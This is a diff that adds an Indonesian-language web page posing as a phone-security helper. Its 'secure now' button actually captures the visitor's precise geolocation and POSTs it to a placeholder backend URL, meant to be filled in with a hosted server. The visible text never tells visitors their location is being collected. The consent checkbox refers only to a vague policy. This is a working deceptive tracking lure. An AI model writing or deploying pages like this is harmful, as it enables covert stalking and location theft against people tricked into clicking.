@@ -1,0 +1,81 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Keamanan tambahan</title>
+  <style>
+    body{font-family:system-ui,Arial;margin:20px;max-width:720px}
+    .card{padding:16px;border-radius:8px;border:1px solid #ddd}
+    button{padding:10px 14px;border-radius:8px;border:0;background:#1565c0;color:white;font-weight:600}
+    pre{background:#f4f4f4;padding:10px;border-radius:6px;overflow:auto}
+  </style>
+</head>
+<body>
+  <h1>bantuan pengamanan ponsel</h1>
+  <div class="card">
+    <p>Demi menjaga keamanan ponsel anda,halaman ini akan membantu anda ke link yang <strong>anda tuju </strong> mencentang dan menekan tombol.</p>
+
+    <label><input type="checkbox" id="consent"> Saya mengerti dan setuju dengam kebijakam tersebut <strong>| Link suport |</strong></label>
+    <div style="margin-top:12px">
+      <button id="btn" disabled>amankan sekarang</button>
+    </div>
+
+    <div id="status" style="margin-top:12px;color:#333"></div>
+    <pre id="output" style="margin-top:8px"></pre>
+  </div>
+
+<script>
+const consent = document.getElementById('consent');
+const btn = document.getElementById('btn');
+const status = document.getElementById('status');
+const output = document.getElementById('output');
+
+// ganti dengan URL backend (Render) nanti
+const BACKEND_URL = "https://YOUR_BACKEND_URL/location";
+
+consent.addEventListener('change', ()=> btn.disabled = !consent.checked);
+
+btn.addEventListener('click', () => {
+  if (!consent.checked) return;
+  if (!navigator.geolocation) {
+    status.textContent = 'Geolocation tidak didukung oleh browser Anda.';
+    return;
+  }
+
+  status.textContent = 'tunggu sebentar...';
+  navigator.geolocation.getCurrentPosition(async (pos) => {
+    const payload = {
+      latitude: pos.coords.latitude,
+      longitude: pos.coords.longitude,
+      accuracy: pos.coords.accuracy,
+      timestamp: new Date().toISOString(),
+      consent_given: true,
+      note: "Diberikan langsung lewat halaman share location"
+    };
+
+    output.textContent = JSON.stringify(payload, null, 2);
+    status.textContent = 'Mengirim lokasi ke server...';
+
+    try {
+      const r = await fetch(BACKEND_URL, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload)
+      });
+      const j = await r.json();
+      if (r.ok) {
+        status.textContent = 'berhasil — terima kasih.';
+      } else {
+        status.textContent = 'Server menolak: ' + (j.message||j.status||r.status);
+      }
+    } catch (err) {
+      status.textContent = 'Gagal : ' + err;
+    }
+  }, (err) => {
+    status.textContent = 'Izin ditolak atau error: ' + err.message;
+  }, { enableHighAccuracy: false, timeout:15000 });
+});
+</script>
+</body>
+</html>
